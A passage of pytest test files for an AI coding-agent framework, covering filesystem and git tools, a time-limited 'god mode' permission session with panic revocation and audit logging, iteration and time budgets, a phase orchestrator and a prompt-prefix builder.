        rc, out, err = fs("delete", str(f))
        assert rc == 0
        assert not f.exists()

    def test_delete_directory(self, fs, tmp_path):
        d = tmp_path / "doomed_dir"
        d.mkdir()
        (d / "child.txt").write_text("x")
        rc, out, err = fs("delete", str(d))
        assert rc == 0
        assert not d.exists()

    def test_delete_nonexistent(self, fs, tmp_path):
        rc, out, err = fs("delete", str(tmp_path / "nope"))
        assert rc == 1
        assert "not found" in err.lower()


class TestFsList:
    def test_list_directory(self, fs, tmp_path):
        (tmp_path / "a.txt").write_text("a")
        (tmp_path / "b.txt").write_text("b")
        rc, out, err = fs("list", str(tmp_path))
        assert rc == 0
        assert "a.txt" in out
        assert "b.txt" in out

    def test_list_recursive(self, fs, tmp_path):
        sub = tmp_path / "sub"
        sub.mkdir()
        (sub / "deep.txt").write_text("d")
        rc, out, err = fs("list", str(tmp_path), recursive=True)
        assert rc == 0
        assert "deep.txt" in out

    def test_list_nonexistent(self, fs, tmp_path):
        rc, out, err = fs("list", str(tmp_path / "nope"))
        assert rc == 1

    def test_list_file_fails(self, fs, tmp_path):
        f = tmp_path / "f.txt"
        f.write_text("x")
        rc, out, err = fs("list", str(f))
        assert rc == 1


class TestFsStat:
    def test_stat_file(self, fs, tmp_path):
        f = tmp_path / "s.txt"
        f.write_text("hello")
        rc, out, err = fs("stat", str(f))
        assert rc == 0
        info = json.loads(out)
        assert info["size"] == 5
        assert info["is_file"] is True
        assert info["is_dir"] is False

    def test_stat_directory(self, fs, tmp_path):
        rc, out, err = fs("stat", str(tmp_path))
        assert rc == 0
        info = json.loads(out)
        assert info["is_dir"] is True

    def test_stat_nonexistent(self, fs, tmp_path):
        rc, out, err = fs("stat", str(tmp_path / "nope"))
        assert rc == 1


class TestFsUnknownAction:
    def test_unknown_action(self, fs, tmp_path):
        rc, out, err = fs("explode", str(tmp_path))
        assert rc == 1
        assert "unknown" in err.lower()

```

## `tests/test_git_tools.py`

```python
# tests/test_git_tools.py — GitTool tests

import pytest
from core.tools.git_tools import GitTool


def make_runner(rc=0, stdout="", stderr=""):
    """Factory for fake subprocess runner."""
    def runner(cmd, *, shell=False, timeout=None, executable=None):
        return rc, stdout, stderr
    return runner


@pytest.fixture
def git():
    """GitTool with fake subprocess runner that returns success."""
    return GitTool(subprocess_runner=make_runner(0, "", ""))


@pytest.fixture
def git_repo(tmp_path):
    """Create a real git repo for integration tests."""
    import subprocess
    subprocess.run(["git", "init", str(tmp_path)], check=True, capture_output=True)
    subprocess.run(
        ["git", "config", "user.email", "test@test.com"],
        cwd=str(tmp_path), check=True, capture_output=True,
    )
    subprocess.run(
        ["git", "config", "user.name", "Test"],
        cwd=str(tmp_path), check=True, capture_output=True,
    )
    return tmp_path


class TestGitReadActions:
    def test_status(self, git):
        rc, out, err = git("status")
        assert rc == 0

    def test_diff_basic(self, git):
        rc, out, err = git("diff")
        assert rc == 0

    def test_diff_staged(self, git):
        gt = GitTool(subprocess_runner=make_runner(0, "staged diff", ""))
        rc, out, err = gt("diff", staged=True)
        assert rc == 0

    def test_diff_path_spec(self, git):
        rc, out, err = git("diff", path_spec="file.py")
        assert rc == 0

    def test_log_default(self, git):
        rc, out, err = git("log")
        assert rc == 0

    def test_log_custom_n(self, git):
        rc, out, err = git("log", n=5, oneline=False)
        assert rc == 0


class TestGitWriteActions:
    def test_add_specific_paths(self, git):
        rc, out, err = git("add", paths=["file1.py", "file2.py"])
        assert rc == 0

    def test_add_all(self, git):
        rc, out, err = git("add")
        assert rc == 0

    def test_commit(self, git):
        rc, out, err = git("commit", message="test commit")
        assert rc == 0

    def test_branch_list(self, git):
        rc, out, err = git("branch")
        assert rc == 0

    def test_branch_create(self, git):
        rc, out, err = git("branch", name="feature")
        assert rc == 0

    def test_branch_delete(self, git):
        rc, out, err = git("branch", name="feature", delete=True)
        assert rc == 0

    def test_stash_push(self, git):
        rc, out, err = git("stash", sub_action="push", message="wip")
        assert rc == 0

    def test_stash_pop(self, git):
        rc, out, err = git("stash", sub_action="pop")
        assert rc == 0

    def test_stash_list(self, git):
        rc, out, err = git("stash", sub_action="list")
        assert rc == 0

    def test_stash_unknown_sub_action(self, git):
        rc, out, err = git("stash", sub_action="explode")
        assert rc == 1
        assert "unknown" in err.lower()

    def test_tag_list(self, git):
        rc, out, err = git("tag", list_tags=True)
        assert rc == 0

    def test_tag_create(self, git):
        rc, out, err = git("tag", name="v1.0")
        assert rc == 0

    def test_tag_annotated(self, git):
        rc, out, err = git("tag", name="v1.0", message="release 1.0")
        assert rc == 0

    def test_reset_mixed(self, git):
        rc, out, err = git("reset", mode="mixed", ref="HEAD~1")
        assert rc == 0

    def test_reset_invalid_mode(self, git):
        rc, out, err = git("reset", mode="nuclear")
        assert rc == 1
        assert "invalid" in err.lower()


class TestGitNetworkActions:
    def test_push_default(self, git):
        rc, out, err = git("push")
        assert rc == 0

    def test_push_specific_branch(self, git):
        rc, out, err = git("push", remote="origin", branch="main")
        assert rc == 0

    def test_pull_default(self, git):
        rc, out, err = git("pull")
        assert rc == 0

    def test_fetch_default(self, git):
        rc, out, err = git("fetch")
        assert rc == 0

    def test_fetch_custom_remote(self, git):
        rc, out, err = git("fetch", remote="upstream")
        assert rc == 0


class TestGitUnknownAction:
    def test_unknown_action(self, git):
        rc, out, err = git("explode")
        assert rc == 1
        assert "unknown" in err.lower()


class TestGitIntegration:
    """Integration tests with real git repos."""

    def test_status_clean_repo(self, git_repo):
        gt = GitTool()
        rc, out, err = gt("status", repo_path=str(git_repo))
        assert rc == 0
        assert out.strip() == ""  # clean repo

    def test_add_and_status(self, git_repo):
        (git_repo / "test.txt").write_text("hello")
        gt = GitTool()
        rc, out, err = gt("add", paths=["test.txt"], repo_path=str(git_repo))
        assert rc == 0
        rc, out, err = gt("status", repo_path=str(git_repo))
        assert rc == 0
        assert "test.txt" in out

    def test_commit_integration(self, git_repo):
        (git_repo / "f.txt").write_text("x")
        gt = GitTool()
        gt("add", paths=["f.txt"], repo_path=str(git_repo))
        rc, out, err = gt("commit", message="init", repo_path=str(git_repo))
        assert rc == 0

    def test_log_after_commit(self, git_repo):
        (git_repo / "f.txt").write_text("x")
        gt = GitTool()
        gt("add", paths=["f.txt"], repo_path=str(git_repo))
        gt("commit", message="first", repo_path=str(git_repo))
        rc, out, err = gt("log", repo_path=str(git_repo))
        assert rc == 0
        assert "first" in out

    def test_diff_shows_changes(self, git_repo):
        (git_repo / "f.txt").write_text("line1")
        gt = GitTool()
        gt("add", paths=["f.txt"], repo_path=str(git_repo))
        gt("commit", message="init", repo_path=str(git_repo))
        (git_repo / "f.txt").write_text("line1\nline2")
        rc, out, err = gt("diff", repo_path=str(git_repo))
        assert rc == 0
        assert "line2" in out

```

## `tests/test_god_mode.py`

```python
# tests/test_god_mode.py — GodModeSession tests

import time
import pytest

from core.contracts.schemas import ProfileMode, AuditEntry
from core.policy.audit import AuditLogger
from core.policy.god_mode import GodModeSession
from core.policy.profiles import policy_for_profile
from core.tools.capability import CapabilityEngine


@pytest.fixture
def audit(tmp_path):
    return AuditLogger(path=tmp_path / "audit.jsonl")


@pytest.fixture
def engine():
    return CapabilityEngine(policy_for_profile(ProfileMode.SAFE))


@pytest.fixture
def god(audit):
    return GodModeSession(audit)


class TestGodModeActivation:
    def test_activate_returns_grant(self, god):
        grant = god.activate(reason="deploy")
        assert grant.reason == "deploy"
        assert grant.ttl_seconds == 300.0
        assert grant.panic_revoked is False

    def test_activate_sets_god_profile(self, god, engine):
        god.activate(reason="test", capability_engine=engine)
        assert engine.current_profile == "god"
        # Should allow any scope
        verdict = engine.check("t", ["nuke.launch"])
        assert verdict.allowed is True

    def test_is_active_after_activate(self, god):
        god.activate(reason="test", ttl=10.0)
        assert god.is_active() is True

    def test_not_active_before_activate(self, god):
        assert god.is_active() is False

    def test_activate_logs_audit(self, god, audit):
        god.activate(reason="deploy fix")
        entries = audit.tail()
        assert len(entries) == 1
        assert entries[0]["event_type"] == "god_activate"
        assert "deploy fix" in entries[0]["detail"]

    def test_custom_ttl(self, god):
        grant = god.activate(reason="quick", ttl=60.0)
        assert grant.ttl_seconds == 60.0


class TestGodModePanic:
    def test_panic_sets_event(self, god):
        god.activate(reason="test")
        god.panic()
        assert god.is_panicked is True

    def test_panic_downgrades_to_safe(self, god, engine):
        god.activate(reason="test", capability_engine=engine)
        god.panic(capability_engine=engine)
        assert engine.current_profile == "safe"

    def test_panic_revokes_grants(self, god, engine):
        god.activate(reason="test", capability_engine=engine)
        # Add an extra grant
        from core.contracts.schemas import PermissionGrant
        engine.add_grant(PermissionGrant(tool_name="t", scope="x.y"))
        god.panic(capability_engine=engine)
        assert len(engine.list_active_grants()) == 0

    def test_panic_marks_grant_revoked(self, god):
        grant = god.activate(reason="test")
        god.panic()
        assert grant.panic_revoked is True

    def test_is_active_false_after_panic(self, god):
        god.activate(reason="test")
        god.panic()
        assert god.is_active() is False

    def test_panic_logs_audit(self, god, audit):
        god.activate(reason="test")
        god.panic()
        entries = audit.tail()
        assert len(entries) == 2  # activate + panic
        assert entries[1]["event_type"] == "panic"
        assert entries[1]["verdict"] == "panic_revoked"

    def test_panic_without_activate(self, god):
        # Should not raise
        god.panic()
        assert god.is_panicked is True


class TestGodModeTTLExpiry:
    def test_auto_downgrade_on_ttl(self, god, engine):
        god.activate(reason="test", ttl=0.1, capability_engine=engine)
        assert engine.current_profile == "god"
        time.sleep(0.3)
        assert engine.current_profile == "dev"

    def test_not_active_after_ttl(self, god):
        god.activate(reason="test", ttl=0.1)
        time.sleep(0.3)
        assert god.is_active() is False

    def test_ttl_logs_expire_event(self, god, engine, audit):
        god.activate(reason="test", ttl=0.1, capability_engine=engine)
        time.sleep(0.3)
        entries = audit.tail()
        event_types = [e["event_type"] for e in entries]
        assert "god_expire" in event_types

    def test_panic_prevents_auto_downgrade(self, god, engine):
        god.activate(reason="test", ttl=0.2, capability_engine=engine)
        god.panic(capability_engine=engine)
        assert engine.current_profile == "safe"
        time.sleep(0.4)
        # Should still be SAFE, not DEV (panic overrides)
        assert engine.current_profile == "safe"


class TestGodModeReactivation:
    def test_reactivate_after_expiry(self, god, engine):
        god.activate(reason="first", ttl=0.1, capability_engine=engine)
        time.sleep(0.2)
        assert god.is_active() is False
        god.activate(reason="second", ttl=10.0, capability_engine=engine)
        assert god.is_active() is True
        assert engine.current_profile == "god"

    def test_reactivate_cancels_old_timer(self, god, engine):
        god.activate(reason="first", ttl=0.3, capability_engine=engine)
        god.activate(reason="second", ttl=10.0, capability_engine=engine)
        time.sleep(0.5)
        # Old timer (0.3s) should have been cancelled
        assert engine.current_profile == "god"

```

## `tests/test_judais.py`

```python
# tests/test_judais.py — Tests for JudAIs personality

import pytest
from tests.conftest import FakeUnifiedClient


class TestJudAIs:
    def test_personality(self, fake_client, memory, fake_tools):
        from judais.judais import JudAIs
        j = JudAIs(debug=False, client=fake_client, memory=memory, tools=fake_tools)
        assert j.personality == "judAIs"

    def test_default_model(self, fake_client, memory, fake_tools):
        from judais.judais import JudAIs
        j = JudAIs(debug=False, client=fake_client, memory=memory, tools=fake_tools)
        assert j.model == "codestral-latest"

    def test_default_provider(self, fake_client, memory, fake_tools):
        from judais.judais import JudAIs
        j = JudAIs(debug=False, client=fake_client, memory=memory, tools=fake_tools)
        assert j.provider == "mistral"

    def test_text_color(self, fake_client, memory, fake_tools):
        from judais.judais import JudAIs
        j = JudAIs(debug=False, client=fake_client, memory=memory, tools=fake_tools)
        assert j.text_color == "red"

    def test_system_message_contains_judais(self, fake_client, memory, fake_tools):
        from judais.judais import JudAIs
        j = JudAIs(debug=False, client=fake_client, memory=memory, tools=fake_tools)
        assert "JudAIs" in j.system_message

    def test_di_forwarding(self, fake_client, memory, fake_tools):
        """Verify **kwargs forwards client/memory/tools to Elf.__init__."""
        from judais.judais import JudAIs
        j = JudAIs(debug=False, client=fake_client, memory=memory, tools=fake_tools)
        assert j.client is fake_client
        assert j.memory is memory
        assert j.tools is fake_tools

    def test_examples_not_empty(self, fake_client, memory, fake_tools):
        from judais.judais import JudAIs
        j = JudAIs(debug=False, client=fake_client, memory=memory, tools=fake_tools)
        assert len(j.examples) > 0

    def test_chat_works(self, fake_client, memory, fake_tools):
        from judais.judais import JudAIs
        j = JudAIs(debug=False, client=fake_client, memory=memory, tools=fake_tools)
        result = j.chat("hello", stream=False)
        assert result == "Hello from fake client"

    def test_provider_override(self, fake_client, memory, fake_tools):
        """JudAIs can accept provider override."""
        from judais.judais import JudAIs
        j = JudAIs(provider="openai", debug=False, client=fake_client, memory=memory, tools=fake_tools)
        assert j.provider == "openai"

```

## `tests/test_kernel_budgets.py`

```python
# tests/test_kernel_budgets.py — Tests for budget config and enforcement

import time
import pytest
from dataclasses import FrozenInstanceError

from core.kernel.state import Phase, SessionState
from core.kernel.budgets import (
    BudgetConfig,
    BudgetExhausted,
    PhaseRetriesExhausted,
    TotalIterationsExhausted,
    PhaseTimeoutExhausted,
    check_phase_retries,
    check_total_iterations,
    check_phase_time,
    check_all_budgets,
)


class TestBudgetConfig:
    def test_defaults(self):
        config = BudgetConfig()
        assert config.max_phase_retries == 3
        assert config.max_total_iterations == 30
        assert config.max_time_per_phase_seconds == 300.0
        assert config.max_tool_output_bytes_in_context == 32_768
        assert config.max_context_tokens_per_role == 16_384

    def test_frozen(self):
        config = BudgetConfig()
        with pytest.raises(FrozenInstanceError):
            config.max_phase_retries = 10

    def test_custom_values(self):
        config = BudgetConfig(
            max_phase_retries=5,
            max_total_iterations=100,
            max_time_per_phase_seconds=60.0,
        )
        assert config.max_phase_retries == 5
        assert config.max_total_iterations == 100
        assert config.max_time_per_phase_seconds == 60.0


class TestCheckPhaseRetries:
    def test_under_limit_no_raise(self):
        state = SessionState(task_description="test")
        state.enter_phase(Phase.CONTRACT)
        config = BudgetConfig(max_phase_retries=3)
        check_phase_retries(state, config)  # Should not raise

    def test_at_limit_raises(self):
        state = SessionState(task_description="test")
        state.enter_phase(Phase.CONTRACT)
        state.phase_retries[Phase.CONTRACT] = 3
        config = BudgetConfig(max_phase_retries=3)
        with pytest.raises(PhaseRetriesExhausted):
            check_phase_retries(state, config)

    def test_over_limit_raises(self):
        state = SessionState(task_description="test")
        state.enter_phase(Phase.CONTRACT)
        state.phase_retries[Phase.CONTRACT] = 5
        config = BudgetConfig(max_phase_retries=3)
        with pytest.raises(PhaseRetriesExhausted):
            check_phase_retries(state, config)

    def test_exception_attributes(self):
        state = SessionState(task_description="test")
        state.enter_phase(Phase.CONTRACT)
        state.phase_retries[Phase.CONTRACT] = 3
        config = BudgetConfig(max_phase_retries=3)
        with pytest.raises(PhaseRetriesExhausted) as exc_info:
            check_phase_retries(state, config)
        assert exc_info.value.phase == Phase.CONTRACT
        assert exc_info.value.retries == 3
        assert exc_info.value.max_retries == 3


class TestCheckTotalIterations:
    def test_under_limit_no_raise(self):
        state = SessionState(task_description="test")
        state.total_iterations = 10
        config = BudgetConfig(max_total_iterations=30)
        check_total_iterations(state, config)  # Should not raise

    def test_at_limit_raises(self):
        state = SessionState(task_description="test")
        state.total_iterations = 30
        config = BudgetConfig(max_total_iterations=30)
        with pytest.raises(TotalIterationsExhausted):
            check_total_iterations(state, config)

    def test_exception_attributes(self):
        state = SessionState(task_description="test")
        state.total_iterations = 30
        config = BudgetConfig(max_total_iterations=30)
        with pytest.raises(TotalIterationsExhausted) as exc_info:
            check_total_iterations(state, config)
        assert exc_info.value.iterations == 30
        assert exc_info.value.max_iterations == 30


class TestCheckPhaseTime:
    def test_within_limit_no_raise(self):
        state = SessionState(task_description="test")
        state.phase_start_time = time.monotonic()  # Just started
        config = BudgetConfig(max_time_per_phase_seconds=300.0)
        check_phase_time(state, config)  # Should not raise

    def test_over_limit_raises(self):
        state = SessionState(task_description="test")
        # Simulate phase started 400 seconds ago
        state.phase_start_time = time.monotonic() - 400.0
        config = BudgetConfig(max_time_per_phase_seconds=300.0)
        with pytest.raises(PhaseTimeoutExhausted):
            check_phase_time(state, config)

    def test_no_start_time_no_raise(self):
        state = SessionState(task_description="test")
        state.phase_start_time = None
        config = BudgetConfig(max_time_per_phase_seconds=1.0)
        check_phase_time(state, config)  # Should not raise


class TestCheckAllBudgets:
    def test_all_under_limit(self):
        state = SessionState(task_description="test")
        config = BudgetConfig()
        check_all_budgets(state, config)  # Should not raise

    def test_iterations_checked_first(self):
        """When both iterations and retries are exceeded, TotalIterationsExhausted fires."""
        state = SessionState(task_description="test")
        state.enter_phase(Phase.CONTRACT)
        state.total_iterations = 30
        state.phase_retries[Phase.CONTRACT] = 5
        config = BudgetConfig(max_total_iterations=30, max_phase_retries=3)
        with pytest.raises(TotalIterationsExhausted):
            check_all_budgets(state, config)


class TestExceptionHierarchy:
    def test_all_subclass_budget_exhausted(self):
        assert issubclass(PhaseRetriesExhausted, BudgetExhausted)
        assert issubclass(TotalIterationsExhausted, BudgetExhausted)
        assert issubclass(PhaseTimeoutExhausted, BudgetExhausted)

    def test_catch_base_catches_all(self):
        """except BudgetExhausted catches all specific exception types."""
        exceptions = [
            PhaseRetriesExhausted(Phase.INTAKE, 3, 3),
            TotalIterationsExhausted(30, 30),
            PhaseTimeoutExhausted(Phase.INTAKE, 400.0, 300.0),
        ]
        for exc in exceptions:
            try:
                raise exc
            except BudgetExhausted:
                pass  # Expected

```

## `tests/test_kernel_orchestrator.py`

```python
# tests/test_kernel_orchestrator.py — Tests for the Orchestrator

import time
import pytest

from core.kernel.state import Phase, SessionState
from core.kernel.budgets import BudgetConfig
from core.kernel.orchestrator import Orchestrator, PhaseResult


class ConfigurableDispatcher:
    """Test stub that returns configured PhaseResult per phase."""

    def __init__(self, results=None):
        self.results = results or {}
        self.call_log = []
        self.default_result = PhaseResult(success=True)
        self._call_count = {}  # Phase -> number of times dispatched

    def dispatch(self, phase, state):
        self.call_log.append(phase)
        count = self._call_count.get(phase, 0)
        self._call_count[phase] = count + 1

        result_or_fn = self.results.get(phase, self.default_result)
        if callable(result_or_fn):
            return result_or_fn(count)
        return result_or_fn


class TestOrchestratorHappyPath:
    def test_drives_through_all_phases(self):
        """With all-success dispatcher, orchestrator visits every phase."""
        dispatcher = ConfigurableDispatcher()
        orch = Orchestrator(dispatcher=dispatcher)
        state = orch.run("test task")
        assert state.current_phase == Phase.COMPLETED

    def test_final_state_is_completed(self):
        dispatcher = ConfigurableDispatcher()
        orch = Orchestrator(dispatcher=dispatcher)
        state = orch.run("test task")
        assert state.current_phase == Phase.COMPLETED
        assert state.halt_reason is None

    def test_all_phases_dispatched(self):
        """Dispatcher receives all 10 execution phases plus FINALIZE."""
        dispatcher = ConfigurableDispatcher()
        orch = Orchestrator(dispatcher=dispatcher)
        orch.run("test task")
        expected = [
            Phase.INTAKE, Phase.CONTRACT, Phase.REPO_MAP, Phase.PLAN,
            Phase.RETRIEVE, Phase.PATCH, Phase.CRITIQUE, Phase.RUN,
            Phase.FINALIZE,
        ]
        assert dispatcher.call_log == expected

    def test_total_iterations_counted(self):
        dispatcher = ConfigurableDispatcher()
        orch = Orchestrator(dispatcher=dispatcher)
        state = orch.run("test task")
        # 9 transitions: INTAKE->CONTRACT->...->RUN->FINALIZE->COMPLETED
        assert state.total_iterations == 9


class TestOrchestratorFixLoop:
    def test_fix_loops_back_to_patch(self):
        """When RUN fails, FIX is dispatched, then loops to PATCH."""
        call_count = {"run": 0}

        def run_result(count):
            call_count["run"] += 1
            if call_count["run"] <= 1:
                return PhaseResult(success=False, error="tests failed")
            return PhaseResult(success=True)

        dispatcher = ConfigurableDispatcher(results={
            Phase.RUN: run_result,
        })
        orch = Orchestrator(dispatcher=dispatcher)
        state = orch.run("test task")
        assert state.current_phase == Phase.COMPLETED

    def test_fix_loop_eventually_succeeds(self):
        """If RUN fails twice then succeeds, state ends COMPLETED."""
        call_count = {"run": 0}

        def run_result(count):
            call_count["run"] += 1
            if call_count["run"] <= 2:
                return PhaseResult(success=False, error="tests failed")
            return PhaseResult(success=True)

        dispatcher = ConfigurableDispatcher(results={
            Phase.RUN: run_result,
        })
        orch = Orchestrator(dispatcher=dispatcher)
        state = orch.run("test task")
        assert state.current_phase == Phase.COMPLETED

    def test_fix_loop_call_order(self):
        """Call log shows correct FIX loop sequence."""
        call_count = {"run": 0}

        def run_result(count):
            call_count["run"] += 1
            if call_count["run"] <= 1:
                return PhaseResult(success=False, error="tests failed")
            return PhaseResult(success=True)

        dispatcher = ConfigurableDispatcher(results={
            Phase.RUN: run_result,
        })
        orch = Orchestrator(dispatcher=dispatcher)
        orch.run("test task")
        expected = [
            Phase.INTAKE, Phase.CONTRACT, Phase.REPO_MAP, Phase.PLAN,
            Phase.RETRIEVE, Phase.PATCH, Phase.CRITIQUE, Phase.RUN,
            Phase.FIX,
            Phase.PATCH, Phase.CRITIQUE, Phase.RUN,
            Phase.FINALIZE,
        ]
        assert dispatcher.call_log == expected


class TestOrchestratorBudgetHalt:
    def test_halts_on_total_iterations(self):
        """Perpetual FIX loop halts after max_total_iterations."""
        dispatcher = ConfigurableDispatcher(results={
            Phase.RUN: PhaseResult(success=False, error="always fails"),
        })
        budget = BudgetConfig(max_total_iterations=15, max_phase_retries=100)
        orch = Orchestrator(dispatcher=dispatcher, budget=budget)
        state = orch.run("test task")
        assert state.current_phase == Phase.HALTED
        assert "iterations" in state.halt_reason.lower()

    def test_halts_on_phase_retries(self):
        """Phase that always fails halts after max_phase_retries."""
        # CONTRACT always fails -> retries accumulate on CONTRACT
        dispatcher = ConfigurableDispatcher(results={
            Phase.CONTRACT: PhaseResult(success=False, error="invalid"),
        })
        budget = BudgetConfig(max_phase_retries=2, max_total_iterations=100)
        orch = Orchestrator(dispatcher=dispatcher, budget=budget)
        state = orch.run("test task")
        assert state.current_phase == Phase.HALTED
        assert "retries" in state.halt_reason.lower()

    def test_halt_reason_set(self):
        dispatcher = ConfigurableDispatcher(results={
            Phase.RUN: PhaseResult(success=False, error="always fails"),
        })
        budget = BudgetConfig(max_total_iterations=12, max_phase_retries=100)
        orch = Orchestrator(dispatcher=dispatcher, budget=budget)
        state = orch.run("test task")
        assert state.halt_reason is not None
        assert len(state.halt_reason) > 0

    def test_fix_loop_halts_after_budget(self):
        """FIX loop that never succeeds halts after max_total_iterations."""
        dispatcher = ConfigurableDispatcher(results={
            Phase.RUN: PhaseResult(success=False, error="tests fail"),
        })
        budget = BudgetConfig(max_total_iterations=20, max_phase_retries=100)
        orch = Orchestrator(dispatcher=dispatcher, budget=budget)
        state = orch.run("test task")
        assert state.current_phase == Phase.HALTED


class TestOrchestratorTimeoutHalt:
    def test_phase_timeout_halts(self):
        """A phase that exceeds time budget causes halt."""
        def slow_dispatch(count):
            return PhaseResult(success=True)

        dispatcher = ConfigurableDispatcher()

        budget = BudgetConfig(max_time_per_phase_seconds=0.0)
        orch = Orchestrator(dispatcher=dispatcher, budget=budget)
        state = orch.run("test task")
        # First phase (INTAKE) is dispatched, then enter_phase to CONTRACT
        # sets timer. Next check_all_budgets finds CONTRACT timed out.
        assert state.current_phase == Phase.HALTED
        assert "timed out" in state.halt_reason.lower()


class TestOrchestratorEdgeCases:
    def test_custom_budget(self):
        dispatcher = ConfigurableDispatcher()
        budget = BudgetConfig(max_total_iterations=50)
        orch = Orchestrator(dispatcher=dispatcher, budget=budget)
        state = orch.run("test task")
        assert state.current_phase == Phase.COMPLETED

    def test_default_budget(self):
        dispatcher = ConfigurableDispatcher()
        orch = Orchestrator(dispatcher=dispatcher)
        state = orch.run("test task")
        assert state.current_phase == Phase.COMPLETED

    def test_dispatcher_returns_raw_value(self):
        """If dispatcher returns non-PhaseResult, it gets wrapped as success."""

        class RawDispatcher:
            def dispatch(self, phase, state):
                return "raw value"

        orch = Orchestrator(dispatcher=RawDispatcher())
        state = orch.run("test task")
        assert state.current_phase == Phase.COMPLETED

```

## `tests/test_kernel_state.py`

```python
# tests/test_kernel_state.py — Tests for Phase enum, transitions, and SessionState

import time
import pytest

from core.kernel.state import (
    Phase,
    TRANSITIONS,
    InvalidTransition,
    validate_transition,
    SessionState,
)


class TestPhaseEnum:
    def test_all_phases_defined(self):
        """All 12 phases exist (10 execution + HALTED + COMPLETED)."""
        names = {p.name for p in Phase}
        expected = {
            "INTAKE", "CONTRACT", "REPO_MAP", "PLAN", "RETRIEVE",
            "PATCH", "CRITIQUE", "RUN", "FIX", "FINALIZE",
            "HALTED", "COMPLETED",
        }
        assert names == expected

    def test_phase_values_unique(self):
        """Every Phase member has a unique value."""
        values = [p.value for p in Phase]
        assert len(values) == len(set(values))


class TestTransitions:
    def test_intake_to_contract(self):
        validate_transition(Phase.INTAKE, Phase.CONTRACT)

    def test_linear_progression(self):
        """Each phase in the linear chain transitions to the next."""
        chain = [
            Phase.INTAKE, Phase.CONTRACT, Phase.REPO_MAP, Phase.PLAN,
            Phase.RETRIEVE, Phase.PATCH, Phase.CRITIQUE, Phase.RUN,
        ]
        for i in range(len(chain) - 1):
            validate_transition(chain[i], chain[i + 1])

    def test_run_to_fix(self):
        validate_transition(Phase.RUN, Phase.FIX)

    def test_run_to_finalize(self):
        validate_transition(Phase.RUN, Phase.FINALIZE)

    def test_fix_to_patch(self):
        validate_transition(Phase.FIX, Phase.PATCH)

    def test_finalize_to_completed(self):
        validate_transition(Phase.FINALIZE, Phase.COMPLETED)

    def test_halted_is_terminal(self):
        assert TRANSITIONS[Phase.HALTED] == frozenset()

    def test_completed_is_terminal(self):
        assert TRANSITIONS[Phase.COMPLETED] == frozenset()

    def test_invalid_transition_raises(self):
        with pytest.raises(InvalidTransition):
            validate_transition(Phase.INTAKE, Phase.RUN)

    def test_backward_transition_raises(self):
        with pytest.raises(InvalidTransition):
            validate_transition(Phase.CONTRACT, Phase.INTAKE)

    def test_every_non_terminal_can_halt(self):
        """Every phase except HALTED/COMPLETED allows transition to HALTED."""
        terminals = {Phase.HALTED, Phase.COMPLETED}
        for phase in Phase:
            if phase in terminals:
                continue
            assert Phase.HALTED in TRANSITIONS[phase], (
                f"{phase.name} cannot transition to HALTED"
            )


class TestSessionState:
    def test_initial_state(self):
        state = SessionState(task_description="do something")
        assert state.current_phase == Phase.INTAKE
        assert state.total_iterations == 0
        assert state.phase_retries == {}
        assert state.halt_reason is None
        assert state.task_description == "do something"

    def test_enter_phase_increments_iterations(self):
        state = SessionState(task_description="test")
        state.enter_phase(Phase.CONTRACT)
        assert state.total_iterations == 1
        state.enter_phase(Phase.REPO_MAP)
        assert state.total_iterations == 2

    def test_enter_phase_sets_timer(self):
        state = SessionState(task_description="test")
        assert state.phase_start_time is None
        state.enter_phase(Phase.CONTRACT)
        assert state.phase_start_time is not None
        assert state.phase_start_time <= time.monotonic()

    def test_enter_invalid_phase_raises(self):
        state = SessionState(task_description="test")
        with pytest.raises(InvalidTransition):
            state.enter_phase(Phase.RUN)

    def test_record_phase_retry(self):
        state = SessionState(task_description="test")
        state.enter_phase(Phase.CONTRACT)
        count = state.record_phase_retry(Phase.CONTRACT)
        assert count == 1
        count = state.record_phase_retry(Phase.CONTRACT)
        assert count == 2

    def test_halt_sets_reason(self):
        state = SessionState(task_description="test")
        state.halt("budget exceeded")
        assert state.current_phase == Phase.HALTED
        assert state.halt_reason == "budget exceeded"

    def test_complete_from_finalize(self):
        state = SessionState(task_description="test")
        # Walk to FINALIZE
        state.enter_phase(Phase.CONTRACT)
        state.enter_phase(Phase.REPO_MAP)
        state.enter_phase(Phase.PLAN)
        state.enter_phase(Phase.RETRIEVE)
        state.enter_phase(Phase.PATCH)
        state.enter_phase(Phase.CRITIQUE)
        state.enter_phase(Phase.RUN)
        state.enter_phase(Phase.FINALIZE)
        state.complete()
        assert state.current_phase == Phase.COMPLETED

    def test_complete_from_wrong_phase_raises(self):
        state = SessionState(task_description="test")
        with pytest.raises(InvalidTransition):
            state.complete()

```

## `tests/test_kv_prefix.py`

```python
# tests/test_kv_prefix.py — Tests for KV-cacheable prefix builder

import pytest
from core.kv_prefix import build_static_prefix
from core.contracts.schemas import PolicyPack


def _describe(name):
    return {"name": name, "description": f"Description of {name}"}


class TestBuildStaticPrefix:
    def test_basic_prefix(self):
        prefix = build_static_prefix(
            system_message="You are a helpful agent.",
            tool_names=["run_shell_command"],
            describe_tool_fn=_describe,
        )
        assert "You are a helpful agent." in prefix
        assert "run_shell_command" in prefix
        assert "Description of run_shell_command" in prefix

    def test_empty_tools(self):
        prefix = build_static_prefix(
            system_message="msg",
            tool_names=[],
            describe_tool_fn=_describe,
        )
        assert "msg" in prefix
        assert "Available tools" not in prefix

    def test_multiple_tools_sorted(self):
        prefix = build_static_prefix(
            system_message="msg",
            tool_names=["z_tool", "a_tool"],
            describe_tool_fn=_describe,
        )
        a_pos = prefix.index("a_tool")
        z_pos = prefix.index("z_tool")
        assert a_pos < z_pos

    def test_with_policy(self):
        policy = PolicyPack(
            allowed_tools=["run_shell_command"],
            sandbox_backend="docker",
        )
        prefix = build_static_prefix(
            system_message="msg",
            tool_names=[],
            describe_tool_fn=_describe,
            policy=policy,
        )
        assert "Session policy" in prefix
        assert "docker" in prefix

    def test_with_empty_policy(self):
        policy = PolicyPack()
        prefix = build_static_prefix(
            system_message="msg",
            tool_names=[],
            describe_tool_fn=_describe,
            policy=policy,
        )
        assert "Session policy" in prefix
        assert "bwrap" in prefix

    def test_no_policy(self):
        prefix = build_static_prefix(
            system_message="msg",
            tool_names=[],
            describe_tool_fn=_describe,
            policy=None,
        )
        assert "Session policy" not in prefix

    def test_deterministic(self):
        """Same inputs produce same output (cacheable)."""
        args = dict(
            system_message="You are agent.",
            tool_names=["a", "b"],
            describe_tool_fn=_describe,
        )
        p1 = build_static_prefix(**args)
        p2 = build_static_prefix(**args)
        assert p1 == p2

    def test_sections_separated_by_double_newline(self):
        prefix = build_static_prefix(
            system_message="msg",
            tool_names=["tool"],
